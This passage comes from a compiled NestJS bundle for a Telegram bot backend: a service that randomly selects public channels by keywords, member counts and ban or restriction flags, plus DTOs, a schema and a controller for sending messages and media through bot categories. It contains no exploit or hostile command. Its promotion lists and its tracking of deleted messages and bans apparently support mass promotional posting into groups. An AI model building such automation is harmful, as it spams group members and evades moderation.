                            { title: { $regex: positiveKeywords.join('|'), $options: 'i' } },
                            { username: { $regex: positiveKeywords.join('|'), $options: 'i' } },
                        ],
                    },
                    {
                        $and: [
                            {
                                title: {
                                    $exists: true,
                                    $type: 'string',
                                    $not: { $regex: negativeKeywords.join('|'), $options: 'i' },
                                },
                            },
                            {
                                username: {
                                    $exists: true,
                                    $type: 'string',
                                    $not: { $regex: negativeKeywords.join('|'), $options: 'i' },
                                },
                            },
                        ],
                    },
                    {
                        channelId: { $nin: notIds },
                        participantsCount: { $gt: this.MIN_PARTICIPANTS_COUNT },
                        username: { $ne: null },
                        deletedCount: { $lte: 30 },
                        canSendMsgs: true,
                        restricted: false,
                        banned: false,
                        forbidden: false,
                    },
                ],
            };
            const pipeline = [
                { $match: query },
                { $addFields: { randomField: { $rand: {} } } },
                { $sort: { randomField: 1 } },
                { $skip: skip },
                { $limit: limit },
                { $project: { randomField: 0 } },
            ];
            return await this.activeChannelModel.aggregate(pipeline, { allowDiskUse: true }).exec();
        }
        catch (error) {
            throw this.handleError(error, 'Failed to fetch active channels');
        }
    }
    async executeQuery(query, sort, limit, skip) {
        try {
            if (!query || Object.keys(query).length === 0) {
                throw new common_1.BadRequestException('Query is required');
            }
            const queryExec = this.activeChannelModel.find(query).lean();
            if (sort && Object.keys(sort).length > 0) {
                queryExec.sort(sort);
            }
            if (limit && limit > 0) {
                queryExec.limit(limit);
            }
            if (skip && skip >= 0) {
                queryExec.skip(skip);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw this.handleError(error, 'Failed to execute query');
        }
    }
    async resetWordRestrictions() {
        try {
            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Request Received for Reset Word Restrictions`);
            await this.activeChannelModel.updateMany({ banned: false }, { $set: { wordRestriction: 0, dMRestriction: 0, updatedAt: new Date() } });
        }
        catch (error) {
            throw this.handleError(error, 'Failed to reset word restrictions');
        }
    }
    async resetAvailableMsgs() {
        try {
            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Request Received for Reset Available Messages`);
            const availableMsgs = await this.getAvailableMessages();
            await this.activeChannelModel.updateMany({
                $expr: {
                    $lt: [{ $size: { $ifNull: ['$availableMsgs', []] } }, 5],
                },
            }, {
                $set: {
                    wordRestriction: 0,
                    dMRestriction: 0,
                    banned: false,
                    availableMsgs,
                    updatedAt: new Date(),
                },
            });
        }
        catch (error) {
            throw this.handleError(error, 'Failed to reset available messages');
        }
    }
    async updateBannedChannels() {
        try {
            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Request Received for Update Banned Channels`);
            await this.activeChannelModel.updateMany({ $or: [{ banned: true }, { private: true }] }, {
                $set: {
                    wordRestriction: 0,
                    dMRestriction: 0,
                    banned: false,
                    private: false,
                    updatedAt: new Date(),
                },
            });
        }
        catch (error) {
            throw this.handleError(error, 'Failed to update banned channels');
        }
    }
    async getAvailableMessages() {
        try {
            const data = await this.promoteMsgsService.findOne();
            return Object.keys(data || {});
        }
        catch (error) {
            throw this.handleError(error, 'Failed to fetch available messages');
        }
    }
    handleError(error, message) {
        (0, parseError_1.parseError)(error, message);
        if (error instanceof common_1.BadRequestException) {
            return error;
        }
        return new common_1.InternalServerErrorException(`${message}: ${error.message}`);
    }
};
exports.ActiveChannelsService = ActiveChannelsService;
exports.ActiveChannelsService = ActiveChannelsService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(active_channel_schema_1.ActiveChannel.name)),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => promote_msgs_service_1.PromoteMsgsService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        promote_msgs_service_1.PromoteMsgsService])
], ActiveChannelsService);


/***/ }),

/***/ "./src/components/active-channels/dto/create-active-channel.dto.ts":
/*!*************************************************************************!*\
  !*** ./src/components/active-channels/dto/create-active-channel.dto.ts ***!
  \*************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateActiveChannelDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateActiveChannelDto {
    constructor() {
        this.reactRestricted = false;
        this.wordRestriction = 0;
        this.dMRestriction = 0;
        this.banned = false;
        this.private = false;
    }
}
exports.CreateActiveChannelDto = CreateActiveChannelDto;
__decorate([
    (0, swagger_1.ApiProperty)(),
    __metadata("design:type", String)
], CreateActiveChannelDto.prototype, "channelId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "broadcast", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: true }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "canSendMsgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: 300 }),
    __metadata("design:type", Number)
], CreateActiveChannelDto.prototype, "participantsCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "restricted", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: true }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "sendMessages", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "reactRestricted", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    __metadata("design:type", String)
], CreateActiveChannelDto.prototype, "title", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    __metadata("design:type", String)
], CreateActiveChannelDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: 0 }),
    __metadata("design:type", Number)
], CreateActiveChannelDto.prototype, "wordRestriction", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: 0 }),
    __metadata("design:type", Number)
], CreateActiveChannelDto.prototype, "dMRestriction", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ type: [String] }),
    __metadata("design:type", Array)
], CreateActiveChannelDto.prototype, "availableMsgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "banned", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: true, required: false }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "megagroup", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false, required: false }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "forbidden", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether the channel is private',
        example: false,
        required: false,
    }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "private", void 0);


/***/ }),

/***/ "./src/components/active-channels/dto/index.ts":
/*!*****************************************************!*\
  !*** ./src/components/active-channels/dto/index.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./create-active-channel.dto */ "./src/components/active-channels/dto/create-active-channel.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./update-active-channel.dto */ "./src/components/active-channels/dto/update-active-channel.dto.ts"), exports);


/***/ }),

/***/ "./src/components/active-channels/dto/update-active-channel.dto.ts":
/*!*************************************************************************!*\
  !*** ./src/components/active-channels/dto/update-active-channel.dto.ts ***!
  \*************************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateActiveChannelDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_active_channel_dto_1 = __webpack_require__(/*! ./create-active-channel.dto */ "./src/components/active-channels/dto/create-active-channel.dto.ts");
class UpdateActiveChannelDto extends (0, swagger_1.PartialType)(create_active_channel_dto_1.CreateActiveChannelDto) {
}
exports.UpdateActiveChannelDto = UpdateActiveChannelDto;


/***/ }),

/***/ "./src/components/active-channels/index.ts":
/*!*************************************************!*\
  !*** ./src/components/active-channels/index.ts ***!
  \*************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ActiveChannelsService = exports.ActiveChannelsModule = exports.ActiveChannelsController = void 0;
var active_channels_controller_1 = __webpack_require__(/*! ./active-channels.controller */ "./src/components/active-channels/active-channels.controller.ts");
Object.defineProperty(exports, "ActiveChannelsController", ({ enumerable: true, get: function () { return active_channels_controller_1.ActiveChannelsController; } }));
var active_channels_module_1 = __webpack_require__(/*! ./active-channels.module */ "./src/components/active-channels/active-channels.module.ts");
Object.defineProperty(exports, "ActiveChannelsModule", ({ enumerable: true, get: function () { return active_channels_module_1.ActiveChannelsModule; } }));
var active_channels_service_1 = __webpack_require__(/*! ./active-channels.service */ "./src/components/active-channels/active-channels.service.ts");
Object.defineProperty(exports, "ActiveChannelsService", ({ enumerable: true, get: function () { return active_channels_service_1.ActiveChannelsService; } }));
__exportStar(__webpack_require__(/*! ./dto */ "./src/components/active-channels/dto/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./schemas */ "./src/components/active-channels/schemas/index.ts"), exports);


/***/ }),

/***/ "./src/components/active-channels/schemas/active-channel.schema.ts":
/*!*************************************************************************!*\
  !*** ./src/components/active-channels/schemas/active-channel.schema.ts ***!
  \*************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ActiveChannelSchema = exports.ActiveChannel = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const utils_1 = __webpack_require__(/*! ../../../utils */ "./src/utils/index.ts");
let ActiveChannel = class ActiveChannel {
};
exports.ActiveChannel = ActiveChannel;
__decorate([
    (0, swagger_1.ApiProperty)({ required: true }),
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], ActiveChannel.prototype, "channelId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ required: true }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], ActiveChannel.prototype, "title", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ type: Number, default: 0 }),
    (0, mongoose_1.Prop)({ type: Number, default: 0 }),
    __metadata("design:type", Number)
], ActiveChannel.prototype, "participantsCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ required: false, default: null }),
    (0, mongoose_1.Prop)({ default: null }),
    __metadata("design:type", String)
], ActiveChannel.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "restricted", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "broadcast", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "sendMessages", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: true }),
    (0, mongoose_1.Prop)({ default: true }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "canSendMsgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "megagroup", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ type: Number, default: 0 }),
    (0, mongoose_1.Prop)({ type: Number, default: 0 }),
    __metadata("design:type", Number)
], ActiveChannel.prototype, "wordRestriction", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ type: Number, default: 0 }),
    (0, mongoose_1.Prop)({ type: Number, default: 0 }),
    __metadata("design:type", Number)
], ActiveChannel.prototype, "dMRestriction", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ type: [String], default: utils_1.defaultMessages }),
    (0, mongoose_1.Prop)({ type: [String], default: utils_1.defaultMessages }),
    __metadata("design:type", Array)
], ActiveChannel.prototype, "availableMsgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "banned", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "forbidden", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "reactRestricted", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "private", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ type: Number, default: null }),
    (0, mongoose_1.Prop)({ type: Number, default: null }),
    __metadata("design:type", Number)
], ActiveChannel.prototype, "lastMessageTime", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ type: Number, default: null }),
    (0, mongoose_1.Prop)({ type: Number, default: null }),
    __metadata("design:type", Number)
], ActiveChannel.prototype, "messageIndex", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ type: Number, default: null }),
    (0, mongoose_1.Prop)({ type: Number, default: null }),
    __metadata("design:type", Number)
], ActiveChannel.prototype, "messageId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "tempBan", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ type: Number, default: 0 }),
    (0, mongoose_1.Prop)({ type: Number, default: 0 }),
    __metadata("design:type", Number)
], ActiveChannel.prototype, "deletedCount", void 0);
exports.ActiveChannel = ActiveChannel = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'activeChannels',
        versionKey: false,
        autoIndex: true,
        timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], ActiveChannel);
exports.ActiveChannelSchema = mongoose_1.SchemaFactory.createForClass(ActiveChannel);


/***/ }),

/***/ "./src/components/active-channels/schemas/index.ts":
/*!*********************************************************!*\
  !*** ./src/components/active-channels/schemas/index.ts ***!
  \*********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./active-channel.schema */ "./src/components/active-channels/schemas/active-channel.schema.ts"), exports);


/***/ }),

/***/ "./src/components/bots/bots.controller.ts":
/*!************************************************!*\
  !*** ./src/components/bots/bots.controller.ts ***!
  \************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BotsController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const bots_service_1 = __webpack_require__(/*! ./bots.service */ "./src/components/bots/bots.service.ts");
const bots_service_2 = __webpack_require__(/*! ./bots.service */ "./src/components/bots/bots.service.ts");
const create_bot_dto_1 = __webpack_require__(/*! ./dto/create-bot.dto */ "./src/components/bots/dto/create-bot.dto.ts");
const send_message_dto_1 = __webpack_require__(/*! ./dto/send-message.dto */ "./src/components/bots/dto/send-message.dto.ts");
const media_dto_1 = __webpack_require__(/*! ./dto/media.dto */ "./src/components/bots/dto/media.dto.ts");
const media_extras_dto_1 = __webpack_require__(/*! ./dto/media-extras.dto */ "./src/components/bots/dto/media-extras.dto.ts");
const media_group_dto_1 = __webpack_require__(/*! ./dto/media-group.dto */ "./src/components/bots/dto/media-group.dto.ts");
let BotsController = class BotsController {
    constructor(botsService) {
        this.botsService = botsService;
    }
    async createBot(createBotDto) {
        return this.botsService.createBot(createBotDto);
    }
    async getBots(category) {
        return this.botsService.getBots(category);
    }
    async getBotById(id) {
        return this.botsService.getBotById(id);
    }
    async updateBot(id, updateBotDto) {
        return this.botsService.updateBot(id, updateBotDto);
    }
    async deleteBot(id) {
        return this.botsService.deleteBot(id);
    }
    async sendMessageByCategory(category, botId, data) {
        if (botId) {
            const bot = await this.botsService.getBotById(botId);
            if (bot.category !== category) {
                throw new Error(`Bot ${botId} does not belong to category ${category}`);
            }
            return this.botsService.sendMessageByBotId(botId, data.message, data.options);
        }
        return this.botsService.sendMessageByCategory(category, data.message, data.options);
    }
    async sendPhotoByCategory(category, botId, data) {
        if (botId) {
            const bot = await this.botsService.getBotById(botId);
            if (bot.category !== category) {
                throw new Error(`Bot ${botId} does not belong to category ${category}`);
            }
        }
        return this.botsService.sendPhotoByCategory(category, data.photo, data.options);
    }
    async sendVideoByCategory(category, botId, data) {
        if (botId) {
            const bot = await this.botsService.getBotById(botId);
            if (bot.category !== category) {
                throw new Error(`Bot ${botId} does not belong to category ${category}`);
            }
        }
        return this.botsService.sendVideoByCategory(category, data.video, data.options);
    }
    async sendAudioByCategory(category, botId, data) {
        if (botId) {
            const bot = await this.botsService.getBotById(botId);
            if (bot.category !== category) {
                throw new Error(`Bot ${botId} does not belong to category ${category}`);
            }
        }
        return this.botsService.sendAudioByCategory(category, data.audio, data.options);
    }
    async sendDocumentByCategory(category, botId, data) {
        if (botId) {
            const bot = await this.botsService.getBotById(botId);
            if (bot.category !== category) {
                throw new Error(`Bot ${botId} does not belong to category ${category}`);
            }
        }
        return this.botsService.sendDocumentByCategory(category, data.document, data.options);
    }
    async sendVoiceByCategory(category, botId, data) {
        if (botId) {
            const bot = await this.botsService.getBotById(botId);
            if (bot.category !== category) {
                throw new Error(`Bot ${botId} does not belong to category ${category}`);
            }
        }
        return this.botsService.sendVoiceByCategory(category, data.voice, data.options);
    }
    async sendAnimationByCategory(category, botId, data) {
        if (botId) {
            const bot = await this.botsService.getBotById(botId);
            if (bot.category !== category) {
                throw new Error(`Bot ${botId} does not belong to category ${category}`);
            }
        }
        return this.botsService.sendAnimationByCategory(category, data.animation, data.options);
    }
    async sendStickerByCategory(category, botId, data) {
        if (botId) {
            const bot = await this.botsService.getBotById(botId);
            if (bot.category !== category) {
                throw new Error(`Bot ${botId} does not belong to category ${category}`);
            }
        }
        return this.botsService.sendStickerByCategory(category, data.sticker, data.options);
    }
    async sendMediaGroupByCategory(category, botId, data) {
        if (botId) {
            const bot = await this.botsService.getBotById(botId);
            if (bot.category !== category) {
                throw new Error(`Bot ${botId} does not belong to category ${category}`);
            }
        }
        return this.botsService.sendMediaGroupByCategory(category, data.media, data.options);
    }
    async getBotStats(category) {
        return this.botsService.getBotStatsByCategory(category);
    }
};
exports.BotsController = BotsController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({
        summary: 'Create a new bot',
        description: 'Creates a new Telegram bot with the provided configuration. The bot will be registered in the system and can be used for message distribution.',
    }),
    (0, swagger_1.ApiResponse)({ status: 201, description: 'Bot has been successfully created' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid bot configuration provided' }),
    (0, swagger_1.ApiResponse)({ status: 409, description: 'Bot with the same token already exists' }),
    (0, swagger_1.ApiBody)({ type: create_bot_dto_1.CreateBotDto, description: 'Bot creation parameters including token and category' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_bot_dto_1.CreateBotDto]),
    __metadata("design:returntype", Promise)
], BotsController.prototype, "createBot", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({
        summary: 'Get all bots or filter by category',
        description: 'Retrieves a list of all registered bots. Can be filtered by category if provided.',
    }),
    (0, swagger_1.ApiQuery)({
        name: 'category',
        required: false,
        description: 'Optional category filter to return only bots of a specific category',
        enum: bots_service_2.ChannelCategory
    }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'List of bots retrieved successfully' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid category provided' }),
    __param(0, (0, common_1.Query)('category')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], BotsController.prototype, "getBots", null);
__decorate([
    (0, common_1.Get)(':id'),
    (0, swagger_1.ApiOperation)({
        summary: 'Get a bot by ID',
        description: 'Retrieves detailed information about a specific bot using its unique identifier.',
    }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Bot details retrieved successfully' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Bot not found' }),
    __param(0, (0, common_1.Param)('id')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], BotsController.prototype, "getBotById", null);
__decorate([
    (0, common_1.Patch)(':id'),
    (0, swagger_1.ApiOperation)({
        summary: 'Update a bot',
        description: 'Updates the configuration of an existing bot. Only provided fields will be modified.',
    }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Bot updated successfully' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Bot not found' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid update parameters' }),
    __param(0, (0, common_1.Param)('id')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], BotsController.prototype, "updateBot", null);
__decorate([
    (0, common_1.Delete)(':id'),
    (0, swagger_1.ApiOperation)({
        summary: 'Delete a bot',
        description: 'Removes a bot from the system. This action cannot be undone.',
    }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Bot successfully deleted' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Bot not found' }),
    __param(0, (0, common_1.Param)('id')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], BotsController.prototype, "deleteBot", null);
__decorate([
    (0, common_1.Post)('category/:category/message'),
    (0, swagger_1.ApiOperation)({
        summary: 'Send a message using bots in a category',
        description: 'Sends a text message using either all bots in a category or a specific bot if botId is provided.',
    }),
    (0, swagger_1.ApiParam)({
        name: 'category',
        description: 'Category of bots to use for sending the message',
        enum: bots_service_2.ChannelCategory
    }),
    (0, swagger_1.ApiQuery)({
        name: 'botId',
        required: false,
        description: 'Optional specific bot ID to use instead of all bots in the category'
    }),
    (0, swagger_1.ApiBody)({
        type: send_message_dto_1.SendMessageDto,
        description: 'Message content and optional formatting parameters'
    }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Message sent successfully' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid message parameters or bot category' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Bot or category not found' }),
    __param(0, (0, common_1.Param)('category')),
    __param(1, (0, common_1.Query)('botId')),
    __param(2, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, send_message_dto_1.SendMessageDto]),
    __metadata("design:returntype", Promise)
], BotsController.prototype, "sendMessageByCategory", null);
__decorate([
    (0, common_1.Post)('category/:category/photo'),
    (0, swagger_1.ApiOperation)({
        summary: 'Send a photo using bots in a category',
        description: 'Sends a photo using either all bots in a category or a specific bot if botId is provided.',
    }),
    (0, swagger_1.ApiParam)({
        name: 'category',
        description: 'Category of bots to use for sending the photo',
        enum: bots_service_2.ChannelCategory
    }),
    (0, swagger_1.ApiQuery)({
        name: 'botId',
        required: false,
        description: 'Optional specific bot ID to use instead of all bots in the category'
    }),
    (0, swagger_1.ApiBody)({
        type: media_dto_1.SendPhotoDto,
        description: 'Photo content and optional caption parameters'
    }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Photo sent successfully' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid photo parameters or bot category' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Bot or category not found' }),
    __param(0, (0, common_1.Param)('category')),
    __param(1, (0, common_1.Query)('botId')),
    __param(2, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, media_dto_1.SendPhotoDto]),
    __metadata("design:returntype", Promise)
], BotsController.prototype, "sendPhotoByCategory", null);
__decorate([
    (0, common_1.Post)('category/:category/video'),
    (0, swagger_1.ApiOperation)({
        summary: 'Send a video using bots in a category',
        description: 'Sends a video using either all bots in a category or a specific bot if botId is provided.',
    }),
    (0, swagger_1.ApiParam)({
        name: 'category',
        description: 'Category of bots to use for sending the video',
        enum: bots_service_2.ChannelCategory
    }),
    (0, swagger_1.ApiQuery)({
        name: 'botId',
        required: false,
        description: 'Optional specific bot ID to use instead of all bots in the category'
    }),
    (0, swagger_1.ApiBody)({
        type: media_dto_1.SendVideoDto,
        description: 'Video content and optional caption parameters'
    }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Video sent successfully' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid video parameters or bot category' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Bot or category not found' }),
    __param(0, (0, common_1.Param)('category')),
    __param(1, (0, common_1.Query)('botId')),
    __param(2, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, media_dto_1.SendVideoDto]),
    __metadata("design:returntype", Promise)
], BotsController.prototype, "sendVideoByCategory", null);
__decorate([
    (0, common_1.Post)('category/:category/audio'),
    (0, swagger_1.ApiOperation)({
        summary: 'Send audio using bots in a category',
        description: 'Sends an audio file using either all bots in a category or a specific bot if botId is provided.',
    }),
    (0, swagger_1.ApiParam)({
        name: 'category',
